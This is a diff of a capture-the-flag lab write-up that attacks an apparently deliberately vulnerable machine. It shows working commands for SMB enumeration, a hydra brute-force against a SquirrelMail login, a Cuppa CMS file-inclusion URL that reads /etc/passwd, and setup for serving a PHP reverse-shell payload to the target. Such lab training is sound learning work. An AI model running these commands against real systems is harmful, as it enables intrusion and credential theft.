@@ -43,22 +43,23 @@ This analysis takes a while. The following directories were listed in the first 
 * /config (Status 301)
 * /ai (Satus 301)
 * /squirrelmail (Status 301) -- Check this out!
+* /server-status
 
 ![image](https://user-images.githubusercontent.com/99097743/170733365-d1597c75-3cac-4cb0-a7b8-0e3402861fd6.png)
 
-It seems that there is no vulnerability documented for **SquirrelMail version 1.4.23**
+**Searchsploit** suggests that there is no vulnerability documented for **SquirrelMail version 1.4.23**
 
 ![image](https://user-images.githubusercontent.com/99097743/170743722-89617c7d-6878-4ec2-b530-1676178865ba.png)
 
-OK, Let's switch to the Port 445/tcp SMB server. We can try the **enum4linux** for enumerating information.
+OK, Let's switch to Port 445/tcp - SMB server. We can try the **enum4linux** for enumerating information.
 
 
 ```sh
   enum4linux -a 10.10.14.219
   ```
-* To do all simple enumerations(-a)
+* To do all simple enumerations (-a)
 
-There are interesting outcomes such as the known usernames:
+There are interesting results such as the known usernames:
 
 ![image](https://user-images.githubusercontent.com/99097743/170734669-57ec1e84-403f-4464-a5a9-6c62c66ebe0b.png)
 
@@ -68,14 +69,20 @@ Here are the sharenames:
 ![image](https://user-images.githubusercontent.com/99097743/170734874-50cb0cc9-7a02-484e-a69e-1e9aa92a5772.png)
 
 
-We can use the **smbclient** to enter the anonymous share. Here are the commonly used commands for smbclient
+We can use the **smbclient** to enter the anonymous share.
 
 
 ```sh
   smbclient '\\10.10.48.162\anonymous'
+  
+  # If you need to enter share with a username
+  smbclient -U milesdyson '\\10.10.246.55\milesdyson'
+  
   ```
   
- We captured a number of log files -- one of which includes a password list for **milesdyson**. Let's use **hydra** for brute-forcing the email account 
+ We captured a number of log files -- one of which includes a password list for the email account: **milesdyson**. 
+ 
+ Let's use **hydra** for brute-forcing the email account 
  
  ```sh
  hydra -l milesdyson -P log1.txt 10.10.48.162 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect" -V -F -u
@@ -86,3 +93,37 @@ We now have access to the email account!
 
 ![image](https://user-images.githubusercontent.com/99097743/170765416-03b102ff-c975-4637-a994-d061991061c4.png)
 
+There is a Samba Password Reset email providing a new password. We can use the credentials to login the SMB share and see that there is a document, entitled important.txt. Here, it reveals the 'hidden directory'. Gobuster suggests that there is another hidden directry as /administrator, please see the figure below. 
+
+![image](https://user-images.githubusercontent.com/99097743/170796322-835a1ab6-695b-442d-b8d6-5b48d7cfc906.png)
+
+Now, let's go to **searchsploit** and search if there is any vulnerability documented for Cuppa CMS:
+
+![image](https://user-images.githubusercontent.com/99097743/170797721-4e0caa91-3458-4107-b093-7957aedb4788.png)
+
+
+```sh
+  searchsploit -m php/webapps/25971.txt
+  #VULNERABILITY: PHP CODE INJECTION
+  An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+  
+  # We basically include the following link:
+  /alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+  
+  so the full URL becomes:
+  http://10.10.246.55/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+  ```
+
+
+Now, we can work on the reverse shell:
+
+STEP 1: Generate the Reverse Shell and save it on the local host (Here, it is called RS.php)
+
+![image](https://user-images.githubusercontent.com/99097743/170798516-8239f698-5ea1-4fb9-9d05-7ad32868babe.png)
+
+STEP 2: Open up an HTTP server to transfer the payload to the target machine
+
+```sh
+  sudo python3 -m http.server 80
+  ```
